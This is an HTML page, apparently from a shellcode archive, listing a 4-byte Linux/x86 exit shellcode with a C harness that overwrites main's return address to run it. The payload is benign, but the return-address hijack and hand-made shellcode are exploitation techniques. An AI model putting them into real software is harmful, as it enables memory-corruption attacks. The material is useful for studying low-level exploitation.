<html><head><title>Linux/x86 - quick (yet conditional, eax != 0 and edx == 0) exit - 4 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * (linux/x86) quick (yet conditional, eax != 0 and edx == 0) exit - 4 bytes
 * - izik &lt;izik@tty64.org&gt;
 */

char shellcode[] = 

	&quot;\xf7\xf0&quot;              // div %eax 
	&quot;\xcd\x80&quot;;             // int $0x80

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&amp;ret + 2;
	(*ret) = (int) shellcode;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
